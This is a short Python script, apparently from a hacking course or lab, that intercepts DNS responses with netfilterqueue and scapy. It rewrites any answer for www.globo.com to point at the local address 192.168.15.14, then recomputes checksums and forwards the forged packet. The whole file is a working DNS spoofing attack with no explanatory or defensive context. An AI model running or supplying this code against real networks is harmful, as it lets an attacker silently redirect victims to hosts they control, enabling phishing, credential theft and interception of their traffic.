import netfilterqueue
import scapy.all as scapy


def process(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if b'www.globo.com' in qname:
            print('[+] Spoofing DNS Response')
            answer = scapy.DNSRR(rrname=qname, rdata='192.168.15.14')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum


            packet.set_payload(bytes(scapy_packet))
    packet.accept()
 

queue = netfilterqueue.NetfilterQueue()
queue.bind(4, process)
queue.run()
